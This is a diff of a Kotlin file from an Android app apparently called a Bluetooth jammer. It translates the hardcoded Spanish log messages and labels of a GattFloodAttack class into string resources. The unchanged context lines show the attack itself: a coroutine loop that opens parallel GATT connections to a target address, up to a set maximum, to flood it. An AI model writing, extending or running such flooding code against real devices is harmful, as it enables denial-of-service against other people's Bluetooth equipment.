@@ -7,6 +7,7 @@ import android.bluetooth.BluetoothGattCallback
 import android.bluetooth.BluetoothManager
 import android.content.Context
 import androidx.core.content.ContextCompat.getSystemService
+import com.eikarna.bluetoothjammer.R
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -27,8 +28,11 @@ class GattFloodAttack(
     private val rateDelayMs: Int = 0
 ) : BluetoothAttack {
 
-    override val displayName = AttackType.GATT_FLOOD.displayName
-    override val description = AttackType.GATT_FLOOD.description
+    private var appContext: Context? = null
+    override val displayName: String
+        get() = appContext?.getString(AttackType.GATT_FLOOD.labelRes) ?: AttackType.GATT_FLOOD.fallbackLabel
+    override val description: String
+        get() = appContext?.getString(AttackType.GATT_FLOOD.descRes) ?: AttackType.GATT_FLOOD.fallbackDesc
 
     private var scope: CoroutineScope? = null
     private val gattConnections = CopyOnWriteArrayList<BluetoothGatt>()
@@ -41,6 +45,7 @@ class GattFloodAttack(
     override fun start(context: Context, onLog: (String) -> Unit) {
         if (running) return
         running = true
+        appContext = context.applicationContext
         val bm = getSystemService(context, BluetoothManager::class.java)
         val adapter = bm?.adapter
         if (adapter == null) {
@@ -58,8 +63,8 @@ class GattFloodAttack(
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
         scope!!.launch {
             var totalOpened = 0
-            onLog("[GATT] Flood iniciado (objetivo $targetAddress)")
-            onLog("[GATT] Máx conexiones paralelas: $maxConcurrent")
+            onLog("[GATT] " + context.getString(R.string.log_gatt_started, targetAddress))
+            onLog("[GATT] " + context.getString(R.string.log_gatt_max, maxConcurrent))
             while (isActive && running) {
                 while (running && gattConnections.size < maxConcurrent) {
                     val gatt = try {
@@ -75,13 +80,13 @@ class GattFloodAttack(
                     if (gatt != null) {
                         gattConnections.add(gatt)
                         totalOpened++
-                        if (totalOpened % 20 == 0) onLog("[CONN] Conexiones abiertas hasta ahora: $totalOpened")
+                        if (totalOpened % 20 == 0) onLog("[CONN] " + context.getString(R.string.log_gatt_opened, totalOpened))
                     }
                     delay(50)
                 }
                 if (rateDelayMs > 0) jitterDelay(rateDelayMs) else delay(400)
             }
-            onLog("[GATT] Flood detenido ($totalOpened conexiones abiertas en total)")
+            onLog("[GATT] " + context.getString(R.string.log_gatt_stopped, totalOpened))
         }
     }
 
